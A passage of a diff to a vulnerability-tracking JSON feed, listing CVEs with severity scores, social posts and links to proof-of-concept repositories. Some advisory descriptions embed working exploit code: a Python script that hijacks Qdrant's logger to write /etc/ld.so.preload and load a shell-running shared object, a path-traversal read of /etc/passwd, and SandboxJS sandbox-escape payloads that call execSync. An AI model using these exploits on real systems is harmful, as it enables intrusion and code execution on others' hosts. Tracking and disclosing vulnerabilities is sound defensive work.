print(\"[+] Log injection successful\")\nelse:\n    print(f\"[-] Error: {error}\")\n    sys.exit(1)\n\nres = s.post(\n    f\"{url}/logger\",\n    json={\n        \"on_disk\": {\n            \"enabled\": False,\n        },\n    },\n)\nres.raise_for_status()\nprint(\"[+] Logger disabled\")\n\ninput(\"Restart Qdrant cluster and press Enter to continue...\")\n\nres = s.get(f\"{url}/dashboard/etc/passwd\")\nres.raise_for_status()\nprint(\"[+] Passwd file retrieved\")\nprint(\"--------------------------------\")\nprint(res.text)\nprint(\"--------------------------------\")\n\nres = s.get(f\"{url}/dashboard/qdrant/config/config.yaml\")\nres.raise_for_status()\nprint(\"[+] Config file retrieved\")\nprint(\"--------------------------------\")\nprint(res.text)\nprint(\"--------------------------------\")\n```\n\n## `exploit_rce.py`\n\n```python\nimport requests\nimport argparse\nimport tempfile\nimport os\n\nTEST_COLLECTION_NAME = \"COLTEST\"\n\n\nparser = argparse.ArgumentParser(description=\"Exploit script for posting to Qdrant API\")\nparser.add_argument(\"--url\", required=False, help=\"Target URL for API\", default=\"http://localhost:6333\")\nparser.add_argument(\"--api-key\", required=False, help=\"API key\")\nparser.add_argument(\"--cmd\", default=\"touch /tmp/touched_by_rce\")\nparser.add_argument(\"--lib\", default=\"\")\n\nargs = parser.parse_args()\n\n\nassert \"'\" not in args.cmd, \"Command must not contain single quotes\"\nso_code = \"\"\"\n#include <stdlib.h>\n#include <unistd.h>\n\n__attribute__((constructor))\nvoid init() {\n    unlink(\"/etc/ld.so.preload\");\n    system(\"/bin/bash -c 'XXXXXXXX'\");\n}\n\"\"\".replace('XXXXXXXX', args.cmd)\n\nwith tempfile.TemporaryDirectory() as tmpdir:\n    with open(f\"{tmpdir}/cmd_code.c\", \"w\") as f:\n        f.write(so_code)\n    os.system(f'gcc -shared -fPIC -o {tmpdir}/cmd.so {tmpdir}/cmd_code.c')\n    cmd_so = open(f'{tmpdir}/cmd.so', \"rb\").read()\n\nurl = args.url\n\nheaders = {}\nif args.api_key:\n    headers[\"api-key\"] = args.api_key\n\ns = requests.Session()\n\ns.headers.update(headers)\n\nres = s.post(\n    f\"{url}/logger\",\n    json={\n        \"log_level\": \"INFO\",\n        \"on_disk\": {\n            \"enabled\": True,\n            \"format\": \"text\",\n            \"log_level\": \"INFO\",\n            \"buffer_size_bytes\": 1,\n            \"log_file\": \"/etc/ld.so.preload\",\n        },\n    },\n)\nres.raise_for_status()\nprint(\"[+] Logger configured\")\n\nres = s.get(\n    f\"{url}/:/qdrant/snapshots/{TEST_COLLECTION_NAME}/hui.so\",\n)\n\nprint(\"[+] Log injected\")\n\n\nres = s.post(\n    f\"{url}/logger\",\n    json={\n        \"on_disk\": {\n            \"enabled\": False,\n        },\n    },\n)\nres.raise_for_status()\nprint(\"[+] Logger disabled\")\n\n\nrsp = s.post(f\"{args.url}/collections/{TEST_COLLECTION_NAME}/snapshots/upload\", files={\"snapshot\": (\"hui.so\", cmd_so, \"application/octet-stream\")})\n\nprint(rsp.text)\n# trigger the stacktace endpoint which will run execute `/qdrant/qdrant --stacktrace`\n\ninput(\"Press Enter to continue...\")\nrsp = s.get(f\"{args.url}/stacktrace\")\nrsp.raise_for_status()\n```\n\n### Impact\nRemote code execution.",
     "repos": [],
-    "updated": "2026-02-06T21:57:22.450000",
+    "updated": "2026-02-06T21:44:00",
     "epss": 0.04
   },
   "CVE-2026-25731": {
-    "cvss3": 0,
-    "severity": null,
+    "cvss3": 7.8,
+    "severity": "HIGH",
     "epss_severity": "LOW",
     "nuclei": null,
     "posts": [
@@ -3890,11 +3911,11 @@
         "created_at": "2026-02-06T21:17:36.000Z"
       }
     ],
-    "description": "N/A",
+    "description": "calibre is an e-book manager. Prior to 9.2.0, a Server-Side Template Injection (SSTI) vulnerability in Calibre's Templite templating engine allows arbitrary code execution when a user converts an ebook using a malicious custom template file via the --template-html or --template-html-index command-line options. This vulnerability is fixed in 9.2.0.",
     "repos": [
       "https://github.com/dxlerYT/CVE-2026-25731"
     ],
-    "updated": null,
+    "updated": "2026-02-06T21:57:22.450000",
     "epss": 0.008
   },
   "CVE-2026-2067": {
@@ -3990,7 +4011,7 @@
     ],
     "description": "A security vulnerability has been detected in UTT \u8fdb\u53d6 520W 1.7.7-180627. This vulnerability affects the function strcpy of the file /goform/formTimeGroupConfig. The manipulation of the argument year1 leads to buffer overflow. The attack may be initiated remotely. The exploit has been disclosed publicly and may be used. The vendor was contacted early about this disclosure but did not respond in any way.",
     "repos": [],
-    "updated": "2026-02-06T21:30:58",
+    "updated": "2026-02-06T21:57:22.450000",
     "epss": 0.043
   },
   "CVE-2026-2066": {
@@ -4044,7 +4065,7 @@
     ],
     "description": "A weakness has been identified in UTT \u8fdb\u53d6 520W 1.7.7-180627. This affects the function strcpy of the file /goform/formIpGroupConfig. Executing a manipulation of the argument groupName can lead to buffer overflow. The attack can be launched remotely. The exploit has been made available to the public and could be used for attacks. The vendor was contacted early about this disclosure but did not respond in any way.",
     "repos": [],
-    "updated": "2026-02-06T21:57:22.450000",
+    "updated": "2026-02-06T21:30:58",
     "epss": 0.043
   },
   "CVE-2026-1340": {
@@ -4203,7 +4224,7 @@
     "repos": [
       "https://github.com/MehdiLeDeaut/CVE-2026-1281-Ivanti-EPMM-RCE"
     ],
-    "updated": "2026-02-04T16:34:21.763000",
+    "updated": "2026-01-30T00:31:28",
     "epss": 0.184
   },
   "CVE-2026-1281": {
@@ -4404,7 +4425,7 @@
     "repos": [
       "https://github.com/MehdiLeDeaut/CVE-2026-1281-Ivanti-EPMM-RCE"
     ],
-    "updated": "2026-01-30T00:31:29",
+    "updated": "2026-01-30T13:28:18.610000",
     "epss": 16.414
   },
   "CVE-2026-25520": {
@@ -4498,9 +4519,9 @@
         "created_at": "2026-02-06T20:17:50.000Z"
       }
     ],
-    "description": "### Summary\n\nThe return values of functions aren't wrapped. `Object.values`/`Object.entries` can be used to get an Array containing the host's `Function` constructor, by using `Array.prototype.at` you can obtain the hosts `Function` constructor, which can be used to execute arbitrary code outside of the sandbox.\n\n### Details\n\nThe return values of functions aren't wrapped, chaining function calls allows bypassing most validation/sanitization. \n\n### PoC\n\n```js\nconst s = require('@nyariv/sandboxjs').default;\nconst sb = new s();\n\npayload = `\nconsole.log(\n  Object.values(this).at(0)(\n    \"return process.getBuiltinModule('child_process').execSync('ls -lah').toString()\",\n  )(),\n);\n`\n\nsb.compile(payload)().run();\n```\n\n```js\nconst s = require(\"@nyariv/sandboxjs\").default;\nconst sb = new s();\n\npayload = `\nconsole.log(\n  Object.entries(this)[0].at(1)(\n    \"return process.getBuiltinModule('child_process').execSync('ls -lah').toString()\",\n  )(),\n);\n`\n\nsb.compile(payload)().run();\n```\n\n```js\nconst s = require(\"@nyariv/sandboxjs\").default;\nconst sb = new s();\n\npayload = `\nconsole.log(\n  Object.entries(this)\n    .at(0)\n    .map((f) => {\n      if (typeof f === 'function') {\n        f.call('', 'return process')()\n          .getBuiltinModule('child_process')\n          .execSync('ls -lah', { stdio: 'inherit' });\n      }\n    }),\n);\n`\n\nsb.compile(payload)().run();\n```\n\n```js\nconst s = require(\"@nyariv/sandboxjs\").default;\nconst sb = new s();\n\npayload = `\nconst t = (f) => {\n  f.call('', 'return process')()\n    .getBuiltinModule('child_process')\n    .execSync('ls -lah', { stdio: 'inherit' });\n};\nconsole.log(t.call(...Object.entries(this)[0]));\n`\n\nsb.compile(payload)().run();\n```\n\n### Impact\n\nSanbox Escape -> RCE",
+    "description": "SandboxJS is a JavaScript sandboxing library. Prior to 0.8.29, The return values of functions aren't wrapped. Object.values/Object.entries can be used to get an Array containing the host's Function constructor, by using Array.prototype.at you can obtain the hosts Function constructor, which can be used to execute arbitrary code outside of the sandbox. This vulnerability is fixed in 0.8.29.",
     "repos": [],
-    "updated": "2026-02-06T21:42:24",
+    "updated": "2026-02-06T21:57:22.450000",
     "epss": 0.078
   },
   "CVE-2026-25643": {
@@ -4800,14 +4821,14 @@
         "created_at": "2026-02-06T20:18:07.000Z"
       }
     ],
-    "description": "### Summary\n\nAs `Map` is in `SAFE_PROTOYPES`, it's prototype can be obtained via `Map.prototype`. By overwriting `Map.prototype.has` the sandbox can be escaped.\n\n### Details\n\nThis is effectively equivalent to CVE-2026-25142, but without `__lookupGetter__`  (`let` was used during testing), it turns out the `let` implementation is bugged:\n\n```js\nlet a = Map.prototype;\nconsole.log(a) // undefined\n```\n\n```js\nconst a = Map.prototype;\nconsole.log(a) // Object [Map] {}\n```\n\n```js\nlet a = 123;\nconsole.log(a) // 123\n```\n\n```js\nconst a = 123;\nconsole.log(a) // 123\n``` \n\n### PoC\n\n```js\nconst s = require(\"@nyariv/sandboxjs\").default;\nconst sb = new s();\n\npayload = `\nconst m = Map.prototype;\nm.has = isFinite;\n\nconsole.log(\n  isFinite.constructor(\n    \"return process.getBuiltinModule('child_process').execSync('ls -lah').toString()\",\n  )(),\n);`;\n\nsb.compile(payload)().run();\n```\n\n### Impact\n\nAble to set `Map.prototype.has` -> RCE",
+    "description": "SandboxJS is a JavaScript sandboxing library. Prior to 0.8.29, as Map is in SAFE_PROTOYPES, it's prototype can be obtained via Map.prototype. By overwriting Map.prototype.has the sandbox can be escaped. This vulnerability is fixed in 0.8.29.",
     "repos": [],
-    "updated": "2026-02-06T21:42:55",
+    "updated": "2026-02-06T21:57:22.450000",
     "epss": 0.048
   },
   "CVE-2025-70963": {
-    "cvss3": 7.6,
-    "severity": "HIGH",
+    "cvss3": null,
+    "severity": null,
     "epss_severity": "LOW",
     "nuclei": null,
     "posts": [
@@ -4854,9 +4875,9 @@
         "created_at": "2026-02-06T19:16:49.000Z"
       }
     ],
-    "description": "Gophish <=0.12.1 is vulnerable to Incorrect Access Control. The administrative dashboard exposes each user\u2019s long-lived API key directly inside the rendered HTML/JavaScript of the page on every login. This makes permanent API credentials accessible to any script running in the browser context.",
+    "description": "Gophish <= 0.12.1 is vulnerable to Incorrect Access Control. The administrative dashboard exposes each user\u2019s long-lived API key directly inside the rendered HTML/JavaScript of the page on every login. This makes permanent API credentials accessible to any script running in the browser context.",
     "repos": [],
-    "updated": "2026-02-06T21:57:22.450000",
+    "updated": "2026-02-06T21:38:16",
     "epss": 0.038
   },
   "CVE-2026-23989": {
@@ -4964,7 +4985,7 @@
     ],
     "description": "An issue in ChestnutCMS v.1.5.8 and before allows a remote attacker to execute arbitrary code via the template creation function",
     "repos": [],
-    "updated": "2026-02-06T17:16:18.283000",
+    "updated": "2026-02-06T18:31:38",
     "epss": 0.253
   },
   "CVE-2025-69906": {
@@ -5020,7 +5041,7 @@
     "repos": [
       "https://github.com/cypherdavy/CVE-2025-69906-Monstra-CMS-3.0.4-Arbitrary-File-Upload-to-RCE"
     ],
-    "updated": "2026-02-06T18:31:38",
+    "updated": "2026-02-06T16:16:14.713000",
     "epss": 0.209
   },
   "CVE-2025-69619": {
@@ -5349,7 +5370,7 @@
     "repos": [
       "https://github.com/DarkSploits/CVE-2026-21643-Exploit"
     ],
-    "updated": "2026-02-06T09:30:35",
+    "updated": "2026-02-06T15:14:47.703000",
     "epss": 0.129
   },
   "CVE-2025-15566": {
@@ -5450,7 +5471,7 @@
     ],
     "description": "A security issue was discovered in ingress-nginx\u00a0where the `nginx.ingress.kubernetes.io/auth-proxy-set-headers` Ingress annotation can be used to inject configuration into nginx. This can lead to arbitrary code execution in the context of the ingress-nginx controller, and disclosure of Secrets accessible to the controller. (Note that in the default installation, the controller can access all Secrets cluster-wide.)",
     "repos": [],
-    "updated": "2026-02-06T15:14:47.703000",
+    "updated": "2026-02-06T06:30:28",
     "epss": 0.034
   },
   "CVE-2025-13607": {
@@ -5516,7 +5537,7 @@
     ],
     "description": "A malicious actor can access camera configuration information, including account credentials, without authenticating when accessing a vulnerable URL.",
     "repos": [],
-    "updated": "2025-12-12T15:18:42.140000",
+    "updated": "2025-12-10T21:31:32",
     "epss": 0.08099999999999999
   },
   "CVE-2026-0391": {
@@ -5621,11 +5642,11 @@
     "repos": [
       "https://github.com/saaydmr/hikvision-exploiter"
     ],
-    "updated": "2026-02-06T12:30:32",
+    "updated": "2026-02-06T15:14:47.703000",
     "epss": 0.082
   },
   "CVE-2025-22225": {
-    "cvss3": 8.2,
+    "cvss3": 8.3,
     "severity": "HIGH",
     "epss_severity": "LOW",
     "nuclei": null,
@@ -5731,11 +5752,11 @@
     ],
     "description": "VMware ESXi contains an arbitrary write\u00a0vulnerability.\u00a0A malicious actor with privileges within the VMX process may trigger an arbitrary kernel write leading to an escape of the sandbox.",
     "repos": [],
-    "updated": "2025-10-30T19:52:45.300000",
+    "updated": "2025-10-22T00:33:13",
     "epss": 6.152
   },
   "CVE-2024-3596": {
-    "cvss3": 9.1,
+    "cvss3": 9.0,
     "severity": "CRITICAL",
     "epss_severity": "HIGH",
     "nuclei": null,
@@ -5853,7 +5874,7 @@
     "repos": [
       "https://github.com/alperenugurlu/CVE-2024-3596-Detector"
     ],
-    "updated": "2025-11-04T18:31:08",
+    "updated": "2025-11-04T18:16:31.367000",
     "epss": 23.846999999999998
   },
   "CVE-2026-1499": {
@@ -6247,15 +6268,15 @@
     ],
     "description": "Reliance on untrusted inputs in a security decision in Microsoft Office allows an unauthorized attacker to bypass a security feature locally.",
     "repos": [
-      "https://github.com/PinPin1140/cve-2026-21509",
-      "https://github.com/SimoesCTT/CTT-NFS-Vortex-RCE",
-      "https://github.com/kimstars/Ashwesker-CVE-2026-21509",
-      "https://github.com/kaizensecurity/CVE-2026-21509",
-      "https://github.com/gavz/CVE-2026-21509-PoC",
-      "https://github.com/ksk-itdk/KSK-ITDK-CVE-2026-21509-Mitigation",
       "https://github.com/decalage2/detect_CVE-2026-21509",
+      "https://github.com/SimoesCTT/CTT-NFS-Vortex-RCE",
+      "https://github.com/kaizensecurity/CVE-2026-21509",
+      "https://github.com/ksk-itdk/KSK-ITDK-CVE-2026-21509-Mitigation",
+      "https://github.com/SimoesCTT/CTT-MICROSOFT-OFFICE-OLE-MANIFOLD-BYPASS-CVE-2026-21509",
       "https://github.com/SimoesCTT/SCTT-2026-33-0007-The-OLE-Vortex-Laminar-Bypass-",
-      "https://github.com/SimoesCTT/CTT-MICROSOFT-OFFICE-OLE-MANIFOLD-BYPASS-CVE-2026-21509"
+      "https://github.com/kimstars/Ashwesker-CVE-2026-21509",
+      "https://github.com/PinPin1140/cve-2026-21509",
+      "https://github.com/gavz/CVE-2026-21509-PoC"
     ],
     "updated": "2026-01-27T16:19:42.330000",
     "epss": 2.912
@@ -6287,7 +6308,7 @@
           "header_static": "https://ioc.exchange/headers/original/missing.png",
           "followers_count": 63,
           "following_count": 0,
-          "statuses_count": 1065,
+          "statuses_count": 1076,
           "last_status_at": "2026-02-08",
           "hide_collections": false,
           "emojis": [],
@@ -6466,8 +6487,8 @@
     "epss": 0.082
   },
   "CVE-2026-25236": {
-    "cvss3": 0,
-    "severity": null,
+    "cvss3": 9.8,
+    "severity": "CRITICAL",
     "epss_severity": "LOW",
     "nuclei": null,
     "posts": [
@@ -6514,9 +6535,9 @@
         "created_at": "2026-02-05T23:19:14.000Z"
       }
     ],
-    "description": "N/A",
+    "description": "PEAR is a framework and distribution system for reusable PHP components. Prior to version 1.33.0, a SQL injection risk exists in karma queries due to unsafe literal substitution for an IN (...) list. This issue has been patched in version 1.33.0.",
     "repos": [],
-    "updated": null,
+    "updated": "2026-02-05T18:06:21.580000",
     "epss": 0.029
   },
   "CVE-2026-25235": {
@@ -6574,8 +6595,8 @@
     "epss": 0.033
   },
   "CVE-2026-25241": {
-    "cvss3": 9.8,
-    "severity": "CRITICAL",
+    "cvss3": 0,
+    "severity": null,
     "epss_severity": "LOW",
     "nuclei": null,
     "posts": [
@@ -6622,9 +6643,9 @@
         "created_at": "2026-02-05T23:18:53.000Z"
       }
     ],
-    "description": "PEAR is a framework and distribution system for reusable PHP components. Prior to version 1.33.0, an unauthenticated SQL injection in the /get/<package>/<version> endpoint allows remote attackers to execute arbitrary SQL via a crafted package version. This issue has been patched in version 1.33.0.",
+    "description": "N/A",
     "repos": [],
-    "updated": "2026-02-05T17:55:10.430000",
+    "updated": null,
     "epss": 0.08099999999999999
   },
   "CVE-2026-24302": {
@@ -6678,7 +6699,7 @@
     ],
     "description": "Azure Arc Elevation of Privilege Vulnerability",
     "repos": [],
-    "updated": "2026-02-06T00:30:37",
+    "updated": "2026-02-06T15:14:47.703000",
     "epss": 0.083
   },
   "CVE-2026-24300": {
@@ -6788,7 +6809,7 @@
     ],
     "description": "Azure Function Information Disclosure Vulnerability",
     "repos": [],
-    "updated": "2026-02-06T00:30:32",
+    "updated": "2026-02-06T15:14:47.703000",
     "epss": 0.093
   },
   "CVE-2026-20979": {
@@ -6842,7 +6863,7 @@
     ],
     "description": "Improper privilege management in Settings prior to SMR Feb-2026 Release 1 allows local attackers to launch arbitrary activity with Settings privilege.",
     "repos": [],
-    "updated": "2026-02-05T21:15:46.767000",
+    "updated": "2026-02-05T21:33:39",
     "epss": 0.005
   },
   "CVE-2026-20983": {
@@ -6900,8 +6921,8 @@
     "epss": 0.005
   },
   "CVE-2026-25049": {
-    "cvss3": null,
-    "severity": null,
+    "cvss3": 9.9,
+    "severity": "CRITICAL",
     "epss_severity": "LOW",
     "nuclei": null,
     "posts": [
@@ -7320,9 +7341,9 @@
         "created_at": "2026-02-04T21:23:57.000Z"
       }
     ],
-    "description": "### Impact\n\nAdditional exploits in the expression evaluation of n8n have been identified and patched following [CVE-2025-68613](https://github.com/n8n-io/n8n/security/advisories/GHSA-v98v-ff95-f3cp).\n\nAn authenticated user with permission to create or modify workflows could abuse crafted expressions in workflow parameters to trigger unintended system command execution on the host running n8n.\n\n### Patches\n\nThe issue has been fixed in n8n versions 1.123.17 and 2.5.2. Users should upgrade to these versions or later to remediate the vulnerability.\n\n### Workarounds\n\nIf upgrading is not immediately possible, administrators should consider the following temporary mitigations:\n\n- Limit workflow creation and editing permissions to fully trusted users only.\n- Deploy n8n in a hardened environment with restricted operating system privileges and network access to reduce the impact of potential exploitation.\n\nThese workarounds do not fully remediate the risk and should only be used as short-term mitigation measures.\n\n### Resources\n\n- Best practices for [securing n8n](https://docs.n8n.io/hosting/securing/overview/)\n- Initial vulnerability advisory: [CVE-2025-68613](https://github.com/n8n-io/n8n/security/advisories/GHSA-v98v-ff95-f3cp)\n\n---\n\nn8n has adopted CVSS 4.0 as primary score for all security advisories. CVSS 3.1 vector strings are provided for backward compatibility.\n\nCVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H",
+    "description": "n8n is an open source workflow automation platform. Prior to versions 1.123.17 and 2.5.2, an authenticated user with permission to create or modify workflows could abuse crafted expressions in workflow parameters to trigger unintended system command execution on the host running n8n. This issue has been patched in versions 1.123.17 and 2.5.2.",
     "repos": [],
-    "updated": "2026-02-04T21:09:38",
+    "updated": "2026-02-05T20:22:47.870000",
     "epss": 0.027
   },
   "CVE-2026-25115": {
@@ -7542,8 +7563,8 @@
     "epss": 0.018000000000000002
   },
   "CVE-2026-25052": {
-    "cvss3": null,
-    "severity": null,
+    "cvss3": 9.9,
+    "severity": "CRITICAL",
     "epss_severity": "LOW",
     "nuclei": null,
     "posts": [
@@ -7590,9 +7611,9 @@
         "created_at": "2026-02-05T22:00:56.000Z"
       }
     ],
-    "description": "## Impact\n\nA vulnerability in the file access controls allows authenticated users with permission to create or modify workflows to read sensitive files from the n8n host system. This can be exploited to obtain critical configuration data and user credentials, leading to complete account takeover of any user on the instance.\n\n## Patches\n\nThe issue has been fixed in n8n version 1.123.18 and 2.5.0. Users should upgrade to this version or later to remediate the vulnerability.\n\n## Workarounds\n\nIf upgrading is not immediately possible, administrators should consider the following temporary mitigations:\n\n- Limit workflow creation and editing permissions to fully trusted users only.\n- Restrict access to nodes that interact with the file system, particularly the \"Read/Write Files from Disk\" and \"Git\" nodes.\n\nThese workarounds do not fully remediate the risk and should only be used as short-term mitigation measures.\n\n## Resources\n\n- [n8n Documentation \u2014 Blocking nodes](https://docs.n8n.io/hosting/securing/blocking-nodes/)\u00a0\u2014 how to globally disable specific nodes\n\n--- \nn8n has adopted CVSS 4.0 as primary score for all security advisories. CVSS 3.1 vector strings are provided for backward compatibility.\n\nCVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H",
+    "description": "n8n is an open source workflow automation platform. Prior to versions 1.123.18 and 2.5.0, a vulnerability in the file access controls allows authenticated users with permission to create or modify workflows to read sensitive files from the n8n host system. This can be exploited to obtain critical configuration data and user credentials, leading to complete account takeover of any user on the instance. This issue has been patched in versions 1.123.18 and 2.5.0.",
     "repos": [],
-    "updated": "2026-02-04T19:53:39",
+    "updated": "2026-02-05T20:32:11.497000",
     "epss": 0.015
   },
   "CVE-2025-68721": {
@@ -7750,7 +7771,7 @@
     "epss": 0.026
   },
   "CVE-2026-0106": {
-    "cvss3": 9.3,
+    "cvss3": 9.4,
     "severity": "CRITICAL",
     "epss_severity": "LOW",
     "nuclei": null,
@@ -7800,7 +7821,7 @@
     ],
     "description": "In vpu_mmap of vpu_ioctl, there is a possible arbitrary address mmap due to a missing bounds check. This could lead to local escalation of privilege with no additional execution privileges needed. User interaction is not needed for exploitation.",
     "repos": [],
-    "updated": "2026-02-06T15:14:47.703000",
+    "updated": "2026-02-06T03:30:19",
     "epss": 0.003
   },
   "CVE-2024-42318": {
@@ -7864,7 +7885,7 @@
     ],
     "description": "In the Linux kernel, the following vulnerability has been resolved:\n\nlandlock: Don't lose track of restrictions on cred_transfer\n\nWhen a process' cred struct is replaced, this _almost_ always invokes\nthe cred_prepare LSM hook; but in one special case (when\nKEYCTL_SESSION_TO_PARENT updates the parent's credentials), the\ncred_transfer LSM hook is used instead.  Landlock only implements the\ncred_prepare hook, not cred_transfer, so KEYCTL_SESSION_TO_PARENT causes\nall information on Landlock restrictions to be lost.\n\nThis basically means that a process with the ability to use the fork()\nand keyctl() syscalls can get rid of all Landlock restrictions on\nitself.\n\nFix it by adding a cred_transfer hook that does the same thing as the\nexisting cred_prepare hook. (Implemented by having hook_cred_prepare()\ncall hook_cred_transfer() so that the two functions are less likely to\naccidentally diverge in the future.)",
     "repos": [],
-    "updated": "2025-11-04T00:31:15",
+    "updated": "2025-11-03T22:18:03.530000",
     "epss": 0.006
   },
   "CVE-2018-19333": {
@@ -7928,7 +7949,7 @@
     ],
     "description": "pkg/sentry/kernel/shm/shm.go in Google gVisor before 2018-11-01 allows attackers to overwrite memory locations in processes running as root (but not escape the sandbox) via vectors involving IPC_RMID shmctl calls, because reference counting is mishandled.",
     "repos": [],
-    "updated": "2023-02-01T05:05:52",
+    "updated": "2024-11-21T03:57:44.773000",
     "epss": 0.166
   },
   "CVE-2025-15311": {
@@ -7982,7 +8003,7 @@
     ],
     "description": "Tanium addressed an unauthorized code execution vulnerability in Tanium Appliance.",
     "repos": [],
-    "updated": "2026-02-05T20:47:37.777000",
+    "updated": "2026-02-05T21:32:48",
     "epss": 0.013999999999999999
   },
   "CVE-2025-15330": {
@@ -8040,8 +8061,8 @@
     "epss": 0.039
   },
   "CVE-2026-1207": {
-    "cvss3": null,
-    "severity": null,
+    "cvss3": 5.4,
+    "severity": "MEDIUM",
     "epss_severity": "LOW",
     "nuclei": null,
     "posts": [
@@ -8088,9 +8109,9 @@
         "created_at": "2026-02-05T18:58:06.000Z"
       }
     ],
-    "description": "An issue was discovered in 6.0 before 6.0.2, 5.2 before 5.2.11, and 4.2 before 4.2.28.\n\nRaster lookups on ``RasterField`` (only implemented on PostGIS) allows remote attackers to inject SQL via the band index parameter. Earlier, unsupported Django series (such as 5.0.x, 4.1.x, and 3.2.x) were not evaluated and may also be affected.\n\nDjango would like to thank Tarek Nakkouch for reporting this issue.",
+    "description": "An issue was discovered in 6.0 before 6.0.2, 5.2 before 5.2.11, and 4.2 before 4.2.28.\nRaster lookups on ``RasterField`` (only implemented on PostGIS) allows remote attackers to inject SQL via the band index parameter.\nEarlier, unsupported Django series (such as 5.0.x, 4.1.x, and 3.2.x) were not evaluated and may also be affected.\nDjango would like to thank Tarek Nakkouch for reporting this issue.",
     "repos": [],
-    "updated": "2026-02-03T19:32:57",
+    "updated": "2026-02-04T17:34:46.147000",
     "epss": 0.013
   },
   "CVE-2026-25240": {
@@ -8148,8 +8169,8 @@
     "epss": 0.029
   },
   "CVE-2026-25239": {
-    "cvss3": 7.5,
-    "severity": "HIGH",
+    "cvss3": 0,
+    "severity": null,
     "epss_severity": "LOW",
     "nuclei": null,
     "posts": [
@@ -8196,14 +8217,14 @@
         "created_at": "2026-02-05T18:15:54.000Z"
       }
     ],
-    "description": "PEAR is a framework and distribution system for reusable PHP components. Prior to version 1.33.0, a SQL injection vulnerability in apidoc queue insertion can allow query manipulation if an attacker can influence the inserted filename value. This issue has been patched in version 1.33.0.",
+    "description": "N/A",
     "repos": [],
-    "updated": "2026-02-05T18:00:51.113000",
+    "updated": null,
     "epss": 0.031
   },
   "CVE-2026-25238": {
-    "cvss3": 0,
-    "severity": null,
+    "cvss3": 9.8,
+    "severity": "CRITICAL",
     "epss_severity": "LOW",
     "nuclei": null,
     "posts": [
@@ -8250,9 +8271,9 @@
         "created_at": "2026-02-05T18:15:44.000Z"
       }
     ],
-    "description": "N/A",
+    "description": "PEAR is a framework and distribution system for reusable PHP components. Prior to version 1.33.0, a SQL injection vulnerability in bug subscription deletion may allow attackers to inject SQL via a crafted email value. This issue has been patched in version 1.33.0.",
     "repos": [],
-    "updated": null,
+    "updated": "2026-02-05T18:01:30.977000",
     "epss": 0.029
   },
   "CVE-2026-2150": {
@@ -8326,13 +8347,13 @@
     ],
     "description": "N/A",
     "repos": [
-      "https://github.com/PinPin1140/cve-2026-21509",
-      "https://github.com/kimstars/Ashwesker-CVE-2026-21509",
-      "https://github.com/kaizensecurity/CVE-2026-21509",
-      "https://github.com/gavz/CVE-2026-21509-PoC",
-      "https://github.com/ksk-itdk/KSK-ITDK-CVE-2026-21509-Mitigation",
       "https://github.com/decalage2/detect_CVE-2026-21509",
-      "https://github.com/SimoesCTT/CTT-MICROSOFT-OFFICE-OLE-MANIFOLD-BYPASS-CVE-2026-21509"
+      "https://github.com/kaizensecurity/CVE-2026-21509",
+      "https://github.com/ksk-itdk/KSK-ITDK-CVE-2026-21509-Mitigation",
+      "https://github.com/SimoesCTT/CTT-MICROSOFT-OFFICE-OLE-MANIFOLD-BYPASS-CVE-2026-21509",
+      "https://github.com/kimstars/Ashwesker-CVE-2026-21509",
+      "https://github.com/PinPin1140/cve-2026-21509",
+      "https://github.com/gavz/CVE-2026-21509-PoC"
     ],
     "updated": null,
     "epss": 0
@@ -8705,14 +8726,14 @@
     ],
     "description": "Water-Melon Melon commit 9df9292 and below is vulnerable to Denial of Service. The HTTP component doesn't have any maximum length. As a result, an excessive request header could cause a denial of service by consuming RAM memory.",
     "repos": [],
-    "updated": "2026-02-05T15:32:15",
+    "updated": "2026-02-05T15:16:08.583000",
     "epss": 0.04
   },
   "CVE-2026-24061": {
     "cvss3": 9.8,
     "severity": "CRITICAL",
     "epss_severity": "HIGH",
-    "nuclei": "https://github.com/projectdiscovery/nuclei-templates/blob/868e4b4fcd0ef2bca8739b8971406ed55739b9d3/code/cves/2026/CVE-2026-24061.yaml",
+    "nuclei": "https://github.com/projectdiscovery/nuclei-templates/blob/80c2051bd6b1b4484ccb2a9459493ab7ddccacfc/code/cves/2026/CVE-2026-24061.yaml",
     "posts": [
       {
         "account": {
@@ -8816,68 +8837,68 @@
     ],
     "description": "telnetd in GNU Inetutils through 2.7 allows remote authentication bypass via a \"-f root\" value for the USER environment variable.",
     "repos": [
-      "https://github.com/BrainBob/Telnet-TestVuln-CVE-2026-24061",
-      "https://github.com/novitahk/Exploit-CVE-2026-24061",
-      "https://github.com/X-croot/CVE-2026-24061_POC",
-      "https://github.com/Mefhika120/Ashwesker-CVE-2026-24061",
-      "https://github.com/nrnw/CVE-2026-24061-GNU-inetutils-Telnet-Detector",
-      "https://github.com/killsystema/scan-cve-2026-24061",
-      "https://github.com/ridpath/Terrminus-CVE-2026-2406",
-      "https://github.com/Lingzesec/CVE-2026-24061-GUI",
-      "https://github.com/madfxr/Twenty-Three-Scanner",
-      "https://github.com/duy-31/CVE-2026-24061---telnetd",
-      "https://github.com/midox008/CVE-2026-24061",
-      "https://github.com/shivam-bathla/CVE-2026-24061-setup",
-      "https://github.com/Good123321-bot/CVE-2026-24061-POC",
-      "https://github.com/androidteacher/CVE-2026-24061-PoC-Telnetd",
-      "https://github.com/MY0723/GNU-Inetutils-telnet-CVE-2026-24061-",
-      "https://github.com/JayGLXR/CVE-2026-24061-POC",
-      "https://github.com/Ali-brarou/telnest",
-      "https://github.com/cyberpoul/CVE-2026-24061-POC",
-      "https://github.com/h3athen/CVE-2026-24061",
-      "https://github.com/SystemVll/CVE-2026-24061",
-      "https://github.com/Mr-Zapi/CVE-2026-24061",
-      "https://github.com/FurkanKAYAPINAR/CVE-2026-24061-telnet2root",
-      "https://github.com/Chocapikk/CVE-2026-24061",
-      "https://github.com/ibrahmsql/CVE-2026-24061-PoC",
-      "https://github.com/LucasPDiniz/CVE-2026-24061",
-      "https://github.com/ms0x08-dev/CVE-2026-24061-POC",
-      "https://github.com/cumakurt/tscan",
-      "https://github.com/Moxxic1/moxxic1.github.io",
-      "https://github.com/0xXyc/telnet-inetutils-auth-bypass-CVE-2026-24061",
-      "https://github.com/xuemian168/CVE-2026-24061",
-      "https://github.com/yanxinwu946/CVE-2026-24061--telnetd",
       "https://github.com/SeptembersEND/CVE--2026-24061",
-      "https://github.com/m3ngx1ng/cve_2026_24061_cli",
+      "https://github.com/MY0723/GNU-Inetutils-telnet-CVE-2026-24061-",
+      "https://github.com/Parad0x7e/CVE-2026-24061",
